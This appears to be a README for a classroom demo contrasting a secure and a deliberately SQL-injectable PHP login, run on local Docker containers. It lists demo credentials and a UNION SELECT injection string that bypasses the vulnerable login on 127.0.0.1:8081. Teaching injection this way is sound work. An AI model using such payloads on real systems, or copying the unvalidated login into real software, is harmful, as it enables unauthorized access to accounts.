# sqli_no_validation
This is for demonstration purposes only and serves as a bad example for students.

How to Run
```bash
docker-compose up --build -d 
docker exec -it php_valid php /var/www/html/init_db.php  
```

The good container is at 127.0.0.1:8080
The bad container is at 127.0.0.1:8081

login:
```
user: test
password: secret
```
or
```
user: evait
password: passport
```
inject on 127.0.0.1:8081
```
user: ' UNION SELECT 'password_what_is_that' --
password: password_what_is_that
```
